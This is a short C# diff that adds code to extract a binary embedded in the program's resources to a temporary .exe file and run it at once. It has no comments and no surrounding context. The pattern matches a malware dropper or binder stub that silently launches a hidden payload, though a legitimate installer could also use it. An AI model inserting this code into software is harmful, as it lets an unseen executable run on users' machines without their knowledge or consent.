@@ -1,0 +1,6 @@
+﻿var rm = new ResourceManager("files", Assembly.GetExecutingAssembly());
+var loc2 = Path.ChangeExtension(Path.GetTempFileName(), "exe");
+var writer = new BinaryWriter(new FileStream(loc2, FileMode.OpenOrCreate));
+writer.Write((byte[])rm.GetObject("[RESOURCE]"));
+writer.Close();
+Process.Start(loc2);
